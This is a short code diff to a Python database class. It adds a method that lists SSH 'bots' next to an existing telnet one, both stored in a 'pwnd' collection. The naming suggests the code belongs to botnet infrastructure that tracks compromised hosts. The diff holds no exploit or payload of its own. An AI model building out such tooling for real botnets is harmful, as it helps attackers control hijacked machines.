@@ -54,4 +54,7 @@ class Database:
         return db.estimated_document_count()
     
     def get_telnet_bot(self):
-        return list(set(self.bots_database['pwnd']['telnet'].find({})))
+        return list(self.bots_database['pwnd']['telnet'].find({}))
+    
+    def get_ssh_bot(self):
+        return list(self.bots_database['pwnd']['ssh'].find({}))
